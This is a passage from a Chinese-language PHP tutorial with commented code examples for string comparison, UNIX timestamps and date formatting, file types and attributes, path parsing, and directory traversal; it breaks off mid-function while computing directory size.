<p>这两个函数的用法相似，都需要传入进行比较的两个字符串参数。可以对输入的str1和str2两字符串，按照字节的ASCII值从两个字符串的首字节开始比较，如果相等则进入下一个字节的比较，直至结束比较。返回以下三个值之一：</p>
<ul>
<li>如果str1等于str2则返回0</li>
<li>如果str1大于str2则返回1</li>
<li>如果str1小于str2则返回-1</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$userName=&quot;Admin&quot;;                     //声明一个字符串作为用户名</span><br><span class="line">	$password=&quot;lampBrother&quot;;                 //声明一个字符串作为密码</span><br><span class="line"></span><br><span class="line">	if(strcasecmp($userName, &quot;admin&quot;)==0) &#123;    //不区分大小写的比较，如果两个字符串相等返回0</span><br><span class="line">		echo &quot;用户名存在&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">     	//将两个比较的字符串使用相应的函数转成全大写或全小写后，也可以实现不区分大小写的比较</span><br><span class="line">     	if(strcasecmp(strtolower($userName), strtolower(&quot;admin&quot;))==0) &#123;   </span><br><span class="line">		echo &quot;用户名存在&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	switch(strcmp($password, &quot;lampbrother&quot;))              //区分字符串中字母的大小写比较</span><br><span class="line">	&#123;</span><br><span class="line">		case 0:                                      //两个字符串相等则返回0</span><br><span class="line">			echo &quot;两个字符串相等&lt;br&gt;&quot;;</span><br><span class="line">			break;</span><br><span class="line">		case 1:                                      //第一个字符串大时则返回1</span><br><span class="line">			echo &quot;第一个字符串大于第二个字符串&lt;br&gt;&quot;;</span><br><span class="line">			break;</span><br><span class="line">		case -1:                                      //第一个字符串小时则返回-1</span><br><span class="line">			echo &quot;第一个字符串小于第二个字符串&lt;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="按自然排序进行字符串比较">按自然排序进行字符串比较</span></h3><p>strnatcmp()函数按自然排序法比较两个字符串，该函数对大小写敏感，其使用格式与strcmp()函数相似。<br>在PHP中也提供了忽略大小写版本的函数strnatcasecmp()，用法和strnatcmp()函数相同。</p>
<h2><span id="正则表达式在字符串处理中的应用">正则表达式在字符串处理中的应用</span></h2><h2><span id="与perl兼容的正则表达式函数">与Perl兼容的正则表达式函数</span></h2><h1><span id="php常用功能模块">PHP常用功能模块</span></h1><h2><span id="日期和时间">日期和时间</span></h2><h3><span id="unix时间戳">UNIX时间戳</span></h3><p>UNIX时间戳是保存日期和时间的一种紧凑简洁的方法，是大多数UNIX系统中保存当前日期和事件的一种方法，也是在大多数计算机语言标识日期和时间的一种标准格式。以32位的整数标识格林威治标准时间，例如整数11230499325表示当前事件的时间戳。UNIX时间戳是从1970年1月1日零点开始起到当前事件所经过的秒数。1970年1月1日零点作为所有日期计算的基础，这个日期通常称为UNIX纪元。</p>
<h4><span id="将日期和时间转变成unix时间戳">将日期和时间转变成UNIX时间戳</span></h4><p>在PHP中，如果需要将日期和事件转变成UNIX时间戳，可以调用mktime()函数。该函数的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int mktime([int hour[,int minute[,int second[,int month[,int day[,int year]]]]]])</span><br></pre></td></tr></table></figure></p>
<p>该函数中所有参数都是可选的，如果参数为空，默认将当前时间转变成UNIX时间戳。这样，和直接调用time()函数获取当前的UNIX时间戳功能相同。参数也可以从右向左省略，任何省略的参数会被设置成本地日期和事件的当前值。如果只想转变日期，对具体的时间不在乎，可以将前三个转变事件的参数都设置为0.mktime()函数对于日期运算和验证非常有用，它可以自动校正越界的输入。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo date(&quot;M-d-Y&quot;, mktime(0, 0, 0, 12, 36, 2007)).&quot;\n&quot;;  //日期超过31天，计算后输出Jan-05-2008</span><br><span class="line">	echo date(&quot;M-d-Y&quot;, mktime(0, 0, 0, 14, 1, 2008)).&quot;\n&quot;;   //月份超过12月，计算后输出Feb-01-2009</span><br><span class="line">	echo date(&quot;M-d-Y&quot;, mktime(0, 0, 0, 1, 1, 2009)).&quot;\n&quot;;    //没有问题的转变，输出结果 Jan-01-2009</span><br><span class="line">	echo date(&quot;M-d-Y&quot;, mktime(0, 0, 0, 1, 1, 99)).&quot;\n&quot;;      //会将99年转变为1999年， Jan-01-1999</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="日期计算">日期计算</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> 	$year = 1981;                                 //从表单中接收用户提交的出生日期中的年份</span><br><span class="line"> 	$month = 11;                                 //从表单中接收用户提交的出生日期中的月份</span><br><span class="line"> 	$day = 05;                                   //从表单中接收用户提交的出生日期中的天</span><br><span class="line">	$birthday = mktime (0, 0, 0, $month, $day, $year);   //将出生日期转变为UNIX时间戳</span><br><span class="line">	$nowdate = time();                            //调用time()函数获取当前时间的UNIX时间戳</span><br><span class="line">	$ageunix = $nowdate - $birthday;                //两个时间戳相减获取用户年龄的UNIX时间戳</span><br><span class="line">	$age = floor($ageunix / (60*60*24*365));         //将UNIX时间戳除以一年的秒数获取用户年龄</span><br><span class="line">	echo &quot;年龄：$age&quot;;                           //输出用户的年龄，根据计算得到结果27</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在以上脚本中，调用mktime()函数将从用户出生日期转变为UNIX时间戳，再调用time()函数获取当前事件的UNIX时间戳。因为这个日期的格式都是使用整数表示的，所以可以将它们相减。又将计算后获取的UNIX时间戳除以一年的秒数，将UNIX时间戳转变为以年度量的单位。</p>
<h3><span id="在php中获取日期和时间">在PHP中获取日期和时间</span></h3><p>PHP中提供了多种获取事件和日期的函数，除了通过time()函数获取当前的UNIX时间戳外，调用getdate()函数确定当前时间，通过gettimeofday()函数获取某一天中的具体时间。此外，在PHP中还可以通过date_sunrise()和date_sunset()两个函数，获取某地点某天的日出时间和日落时间。</p>
<h3><span id="日期和时间格式化输出">日期和时间格式化输出</span></h3><p>在PHP中可以调用date()函数格式化一个本地事件和日期，该函数的原型如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string date(string format[,int timestamp])   		//格式化一个本地时间和日期</span><br></pre></td></tr></table></figure></p>
<p>该函数有两个参数，第一个参数是必需的，规定时间戳的转换格式。第二个参数是可选的，需要提供一个UNIX时间戳，如果没有指定这个时间戳，默认值为time()将返回当前的日期和时间。该函数返回一个格式化后表示适当日期的字符串。date()函数的常见调用方式如下所示：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo date(&quot;Y-m-d H:i:s&quot;);			//输出当前的时间格式：xxxx-xx-xx xx:xx:xx</span><br></pre></td></tr></table></figure></p>
<h1><span id="文件系统处理">文件系统处理</span></h1><h2><span id="文件系统概述">文件系统概述</span></h2><h3><span id="文件类型">文件类型</span></h3><p>PHP是以UNIX的文件系统为模型的，因此在Windows系统中我们只能获得“file”、“dir”或者“unknown”三种文件类型。而在UNIX系统中，我们可以获得“block”、“char”、“dir”、“fifo”、“file”、“link”和“unknown”七种类型。</p>
<table>
<thead>
<tr>
<th>文件类型</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>block</td>
<td style="text-align:left">块设备文件，如某个磁盘分区、软驱、光驱CD-ROM等</td>
</tr>
<tr>
<td>char</td>
<td style="text-align:left">字符设备是指在I/O传输过程中以字符为单位进行传输的设备，例如键盘，打印机等</td>
</tr>
<tr>
<td>dir</td>
<td style="text-align:left">目录类型，目录也是文件的一种</td>
</tr>
<tr>
<td>fifo</td>
<td style="text-align:left">命名管道，常用与将信息从一个进程传递到另一个进程</td>
</tr>
<tr>
<td>file</td>
<td style="text-align:left">普通文件类型，如文本文件或可执行文件等</td>
</tr>
<tr>
<td>link</td>
<td style="text-align:left">符号链接，是指向文件指针的指针，类似Windows中的快捷键</td>
</tr>
<tr>
<td>unkonwn</td>
<td style="text-align:left">未知类型</td>
</tr>
</tbody>
</table>
<p>在PHP中可以使用filetype()函数获取文件的上述类型，该函数接受一个文件名作为参数，如果文件不存在将返回FALSE。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	//获取Linux系统下文件类型</span><br><span class="line">	echo filetype(&apos;/etc/passwd&apos;);      //输出file，/etc/passwd为普通文件</span><br><span class="line">	echo filetype(&apos;/etc/grub.conf&apos;);    //输出link，/etc/grub.conf为链接文件，链接到/boot/grub/grub.conf</span><br><span class="line">	echo filetype(&apos;/etc/&apos;);            //输出dir，/etc/为一个目录，即文件夹</span><br><span class="line">	echo filetype(&apos;/dev/sda1&apos;);        //输出block，/dev/sda1为块设备，它是一个分区</span><br><span class="line">	echo filetype(&apos;/dev/tty01&apos;);       //输出char，为字符设备，它是一个字符终端</span><br><span class="line"></span><br><span class="line">	//获取Windows系统下文件类型</span><br><span class="line">	echo filetype(&quot;C:\\WINDOWS\\php.ini&quot;);     //输出file，C:\WINDOWS\php.ini为一个普通文件</span><br><span class="line">	echo filetype(&quot;C:\\WINDOWS&quot;);            //输出dir，C:\WINDOWS为一个文件夹（目录）</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>对于一个已知的文件，还可以使用is_file()函数判断给定的文件名是否为一个正常的文件。和它类似的，使用is_dir()函数判断给定的文件名是否是一个目录，使用is_link()函数判断给定的文件名是否为一个符号链接。</p>
<h3><span id="文件属性">文件属性</span></h3><p>PHP中提供用来获取文件的一些常见属性的内置函数。</p>
<table>
<thead>
<tr>
<th>函数名</th>
<th style="text-align:left">作用</th>
<th>参数</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>file_exists()</td>
<td style="text-align:left">检查文件或目录是否存在</td>
<td>文件名</td>
<td style="text-align:left">文件存在返回TRUE，不存在则返回FALSE</td>
</tr>
<tr>
<td>filesize()</td>
<td style="text-align:left">取得文件大小</td>
<td>文件名</td>
<td style="text-align:left">返回文件大小的字节数，出错返回FALSE</td>
</tr>
<tr>
<td>is_readable()</td>
<td style="text-align:left">判断给定文件名是否可读</td>
<td>文件名</td>
<td style="text-align:left">如果文件存在且可读则返回TRUE</td>
</tr>
<tr>
<td>is_writable()</td>
<td style="text-align:left">判断给定文件名是否可写</td>
<td>文件名</td>
<td style="text-align:left">如果文件存在且可写则返回TRUE</td>
</tr>
<tr>
<td>is_executable()</td>
<td style="text-align:left">判断给定文件名是否可执行</td>
<td>文件名</td>
<td style="text-align:left">如果文件存在且可执行则返回TRUE</td>
</tr>
<tr>
<td>filectime()</td>
<td style="text-align:left">获取文件的创建时间</td>
<td>文件名</td>
<td style="text-align:left">返回UNIX时间戳格式</td>
</tr>
<tr>
<td>filemtime()</td>
<td style="text-align:left">获取文件的修改时间</td>
<td>文件名</td>
<td style="text-align:left">返回UNIX时间戳格式</td>
</tr>
<tr>
<td>fileatime()</td>
<td style="text-align:left">获取文件的访问时间</td>
<td>文件名</td>
<td style="text-align:left">返回UNIX时间戳格式</td>
</tr>
<tr>
<td>stat()</td>
<td style="text-align:left">获取文件大部分属性值</td>
<td>文件名</td>
<td style="text-align:left">返回关于给定文件有用信息的数组</td>
</tr>
</tbody>
</table>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function getFilePro($fileName) &#123;     //声明一个函数，通过传入一个文件名称获取文件大部分属性</span><br><span class="line">		if(!file_exists($fileName)) &#123;     //如果提供的文件或目录不存在，则直接退出函数</span><br><span class="line">			echo &quot;目标文件不存在！！&lt;br&gt;&quot;;</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		if(is_file($fileName))          //判断是否是一个普通文件，如果是则条件成立</span><br><span class="line">			echo $fileName.&quot;是一个文件&lt;br&gt;&quot;;</span><br><span class="line">		if(is_dir($fileName))          //判断是否是一个目录，如果是则条件成立，输出下面语句</span><br><span class="line">			echo $fileName.&quot;是一个目录&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">		echo &quot;文件型态：&quot;.getFileType($fileName).&quot;&lt;br&gt;&quot;;       //用定义的函数输出文件型态</span><br><span class="line">		echo &quot;文件大小：&quot;.getFileSize(filesize($fileName)).&quot;&lt;br&gt;&quot;; //获取文件大小，并自定义转换单位</span><br><span class="line">		</span><br><span class="line">		if(is_readable($fileName))     //判断提供的文件是否可以读取内容</span><br><span class="line">			echo &quot;文件可读&lt;br&gt;&quot;;</span><br><span class="line">	  	if(is_writable($fileName))     //判断提供的文件是否可以改写</span><br><span class="line">			echo &quot;文件可写&lt;br&gt;&quot;;</span><br><span class="line">		if(is_executable($fileName))   //判断提供的文件是否有执行的权限</span><br><span class="line">			echo &quot;文件可执行&lt;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">	  	echo &quot;文件建立时间: &quot;.date(&quot;Y 年 m 月 j 日&quot;,filectime($fileName)).&quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;文件最后更动时间: &quot;.date(&quot;Y 年 m 月 j 日&quot;,filemtime($fileName)).&quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;文件最后打开时间: &quot;.date(&quot;Y 年 m 月 j 日&quot;,fileatime($fileName)).&quot;&lt;br&gt;&quot;;		</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function getFileType($fileName) &#123;    //声明一个函数用来返回文件的类型</span><br><span class="line">		switch(filetype($fileName))&#123;    //通过filetype()函数返回的文件类型做为选择的条件</span><br><span class="line">			case &apos;file&apos;:</span><br><span class="line">				$type.=&quot;普通文件&quot;;		</span><br><span class="line">				break;			</span><br><span class="line">			case &apos;dir&apos;:</span><br><span class="line">				$type.=&quot;目录文件&quot;;		</span><br><span class="line">				break;			</span><br><span class="line">			case &apos;block&apos;:</span><br><span class="line">				$type.=&quot;块设备文件&quot;;		</span><br><span class="line">				break;			</span><br><span class="line">			case &apos;char&apos;:</span><br><span class="line">				$type.=&quot;字符设备文件&quot;;		</span><br><span class="line">				break;			</span><br><span class="line">			case &apos;fifo&apos;:</span><br><span class="line">				$type.=&quot;命名管道文件&quot;;		</span><br><span class="line">				break;			</span><br><span class="line">			case &apos;link&apos;:</span><br><span class="line">				$type.=&quot;符号链接&quot;;		</span><br><span class="line">				break;			</span><br><span class="line">			case &apos;unknown&apos;:</span><br><span class="line">				$type.=&quot;末知类型&quot;;		</span><br><span class="line">				break;	</span><br><span class="line">			default:</span><br><span class="line">				$type.=&quot;没有检测到类型&quot;;		</span><br><span class="line">		&#125;</span><br><span class="line">		return $type;        //返回转换后的类型</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function getFileSize($bytes) &#123;        //自定义一个文件大小单位转换函数</span><br><span class="line">		if ($bytes &gt;= pow(2,40)) &#123;      //如果提供的字节数大于等于2的40次方，则条件成立</span><br><span class="line">			$return = round($bytes / pow(1024,4), 2);    //将字节大小转换为同等的T大小</span><br><span class="line">			$suffix = &quot;TB&quot;;                         //单位为TB</span><br><span class="line">		&#125; elseif ($bytes &gt;= pow(2,30)) &#123;  //如果提供的字节数大于等于2的30次方，则条件成立</span><br><span class="line">			$return = round($bytes / pow(1024,3), 2);    //将字节大小转换为同等的G大小</span><br><span class="line">			$suffix = &quot;GB&quot;;                         //单位为GB</span><br><span class="line">		&#125; elseif ($bytes &gt;= pow(2,20)) &#123;  //如果提供的字节数大于等于2的20次方，则条件成立</span><br><span class="line">			$return = round($bytes / pow(1024,2), 2);    //将字节大小转换为同等的M大小</span><br><span class="line">			$suffix = &quot;MB&quot;;                         //单位为MB</span><br><span class="line">		&#125; elseif ($bytes &gt;= pow(2,10)) &#123;  //如果提供的字节数大于等于2的10次方，则条件成立</span><br><span class="line">			$return = round($bytes / pow(1024,1), 2);    //将字节大小转换为同等的K大小</span><br><span class="line">			$suffix = &quot;KB&quot;;                         //单位为KB</span><br><span class="line">		&#125; else &#123;                     //否则提供的字节数小于2的10次方，则条件成立</span><br><span class="line">			$return = $bytes;                       //字节大小单位不变</span><br><span class="line">			$suffix = &quot;Byte&quot;;                       //单位为Byte</span><br><span class="line">		&#125;</span><br><span class="line">		return $return .&quot; &quot; . $suffix;                    //返回合适的文件大小和单位</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	getFilePro(&quot;file.php&quot;);  //调用自定义函数，将当前目录下的file.php文件传入，获取属性</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="目录的基本操作">目录的基本操作</span></h2><h3><span id="解析目录路径">解析目录路径</span></h3><p>要描述一个文件的位置，可以使用绝对路径和相对路径。绝对路径是从根开始一级一级地进入各个子目录，最后指定该文件名或目录名。而相对路径是从当前目录进入某目录，最后指定该文件名或目录名。在系统的每个目录下都有两个特殊的目录“.”和“..”，分别指示当前目录和当前目录的父目录。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$unixPath=&quot;/var/www/html/index.php&quot;;		//在UNIX系统中的绝对路径，必须使用“/”作为路径分隔符</span><br><span class="line">$winPath=&quot;C:\\Appserv\\www\\index.php&quot;;		//在Windows系统中的绝对路径，默认使用“\”作为路径分隔符</span><br><span class="line">$winPath=&quot;C:\\Appserv\\www\\index.php&quot;;		//在Windows系统中也接受使用“/”作为路径分隔符</span><br><span class="line">$fileName1=&quot;file.txt&quot;;			//相对路径，当前目录下的file.txt文件</span><br><span class="line">$fileName2=&quot;javascript/common.js&quot;;			//相对路径。当前路径中javascript子目录下的common.js文件</span><br><span class="line">$fileName3=&quot;../images/logo.gif&quot;;			//相对路径。上一级目录中images子目录下的logo.gif文件</span><br></pre></td></tr></table></figure></p>
<p>为了程序可以有很好的移植性，建议都使用“/”作为文件的路径分隔符。</p>
<h4><span id="函数basename">函数basename()</span></h4><p>该函数给出一个包含有指向一个文件的全部路径的字符串，本函数返回基本的文件名。第二个参数是可选参数，规定文件的扩展名。如果提供了则不会输出这个扩展名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$path = &quot;/var/www/html/page.php&quot;;    //包含有指向一个文件的全路径的字符串</span><br><span class="line"></span><br><span class="line">	echo basename($path);             //显示带有文件扩展名的文件名，输出page.php</span><br><span class="line">	echo basename($path,&quot;.php&quot;);       //显示不带有文件扩展名的文件名，输出page</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="函数dirname">函数dirname()</span></h4><p>该函数只需要一个参数，给出一个包含有指向一个文件的全路径的字符串，本函数返回去掉文件名后的目录名。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$path = &quot;/var/www/html/page.php&quot;;  //包含有指向一个文件的全路径的字符串</span><br><span class="line"></span><br><span class="line">	echo dirname($path);              //返回目录名/var/www/html</span><br><span class="line">	echo dirname(&apos;c:/&apos;);                //返回目录名c:/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="函数pathinfo">函数pathinfo()</span></h4><p>函数pathinfo()返回一个关联数组，其中包括指定路径中的目录名、基本名和扩展名三个部分。分别通过数组键dirname、basename和extension来引用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$path = &quot;/var/www/html/page.php&quot;;  //包含有指向一个文件的全路径的字符串</span><br><span class="line">	$path_parts=pathinfo($path);        //返回包括指定路径中的目录名、基本名和扩展名关联数组</span><br><span class="line">	echo $path_parts[&quot;dirname&quot;];        //输出目录名/var/www/html</span><br><span class="line">	echo $path_parts[&quot;basename&quot;];       //输出基本名page.php</span><br><span class="line">	echo $path_parts[&quot;extension&quot;];       //输出扩展名.php</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="遍历目录">遍历目录</span></h3><p>在进行PHP编程的时候，需要对服务器某个目录下面的文件进行浏览，通常称为遍历目录。取得一个目录下的文件和子目录，就需要用到opendir()函数、readdir()函数、closedir()函数和rewinddir()函数。</p>
<ul>
<li>函数opendir()用于打开指定目录，接受一个目录的路径及目录名作为参数，函数返回值为可供其他目录函数使用的目录句柄。如果该目录不存在或没有访问权限，则返回FALSE。</li>
<li>函数readdir()用于读取指定目录，接受已经用opendir()函数打开的可操作目录句柄作为参数，函数返回当前目录指针位置的一个文件名，并将目录指针向后移动一位。当指针位于目录的结尾时，因为没有文件存在则返回FALSE。</li>
<li>函数closedir()关闭指定目录，接受已经用opendir()函数打开的可操作目录句柄作为参数。函数无返回值，运行后将关闭打开的目录。</li>
<li>函数rewinddir()倒回目录句柄，接收已经用opendir()函数打开的可操作目录句柄作为参数。将目录指针重置目录到开始处，即倒回目录开头。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$num=0;                          	//用来统计子目录和文件的个数</span><br><span class="line">	$dirname=&apos;phpMyAdmin&apos;;            	//定义一个变量，保存当前目录下用来遍历的一个目录名</span><br><span class="line">	$dir_handle=opendir($dirname);       	//用opendir打开目录</span><br><span class="line"></span><br><span class="line">     	//将遍历的目录和文件名使用表格格式输出</span><br><span class="line">	echo &apos;&lt;table border=&quot;0&quot; align=&quot;center&quot; width=&quot;600&quot; cellspacing=&quot;0&quot; cellpadding=&quot;0&quot;&gt;&apos;;</span><br><span class="line">	echo &apos;&lt;caption&gt;&lt;h2&gt;目录&apos;.$dirname.&apos;下面的内容&lt;/h2&gt;&lt;/caption&gt;&apos;;     //输出表格标题</span><br><span class="line">	echo &apos;&lt;tr align=&quot;left&quot; bgcolor=&quot;#cccccc&quot;&gt;&apos;;                        //输出表格的字段名</span><br><span class="line">	echo &apos;&lt;th&gt;文件名&lt;/th&gt;&lt;th&gt;文件大小&lt;/th&gt;&lt;th&gt;文件类型&lt;/th&gt;&lt;th&gt;修改时间&lt;/th&gt;&lt;/tr&gt;&apos;;</span><br><span class="line">	while($file=readdir($dir_handle)) &#123;    		//使用readdir循环读取目录里的内容</span><br><span class="line">		$dirFile=$dirname.&quot;/&quot;.$file;      	//将目录下的文件和当前目录连接起来，才能在程序中使用</span><br><span class="line">		if($num++%2==0)             		//隔行一种颜色，同时也将计数器num累加</span><br><span class="line">			$bgcolor=&apos;#ffffff&apos;;         	//单行为白色背景</span><br><span class="line">		else</span><br><span class="line">			$bgcolor=&apos;#cccccc&apos;;        	//双行为灰色背景</span><br><span class="line">		echo &apos;&lt;tr bgcolor=&apos;.$bgcolor.&apos;&gt;&apos;;            	//输出行开始标记，并使用背景色</span><br><span class="line">		echo &apos;&lt;td&gt;&apos;.$file.&apos;&lt;/td&gt;&apos;;                   	//显示文件名</span><br><span class="line">         	echo &apos;&lt;td&gt;&apos;.filesize($dirFile).&apos;&lt;/td&gt;&apos;;         //显示文件大小</span><br><span class="line">         	echo &apos;&lt;td&gt;&apos;.filetype($dirFile).&apos;&lt;/td&gt;&apos;;         //显示文件类型</span><br><span class="line">         	echo &apos;&lt;td&gt;&apos;.date(&quot;Y/n/t&quot;,filemtime($dirFile)).&apos;&lt;/td&gt;&apos;;       //格式化显示文件修改时间</span><br><span class="line">         	echo &apos;&lt;/tr&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	echo &apos;&lt;/table&gt;&apos;;                                     //关闭表格标记</span><br><span class="line">	closedir($dir_handle);                               //关闭文件操作句柄</span><br><span class="line"></span><br><span class="line">	echo &apos;在&lt;b&gt;&apos;.$dirname.&apos;&lt;/b&gt;目录下的子目录和文件共有&lt;b&gt;&apos;.$num.&apos;&lt;/b&gt;个&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="统计目录大小">统计目录大小</span></h3><p>计算文件的大小可以通过filesize()函数完成，统计磁盘大小也可以使用disk_free_space()和disk_total_space()两个函数实现。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function dirSize($directory) &#123;     	//自定义一个函数dirSize()，统计传入参数的目录大小</span><br><span class="line">		$dir_size=0;              	//整型变量初值为0，用来累加各个文件大小从而计算目录大小</span><br><span class="line"></span><br><span class="line">		if($dir_handle=@opendir($directory)) &#123;           		//打开目录，并判断是否能成功打开</span><br><span class="line">			while($filename=readdir($dir_handle)) &#123;      		//循环遍历目录下的所有文件</span><br><span class="line">				if($filename!=&quot;.&quot; &amp;&amp; $filename!=&quot;..&quot;) &#123;  	//一定要排除两个特殊的目录</span><br><span class="line">				    $subFile=$directory.&quot;/&quot;.$filename;   	//将目录下的子文件和当前目录相连</span><br><span class="line">					if(is_dir($subFile))               	//如果为目录</span><br><span class="line">						$dir_size+=dirSize($subFile);   //递归地调用自身函数，求子目录的大小</span><br><span class="line">					if(is_file($subFile))               	//如果是文件</span><br><span class="line">						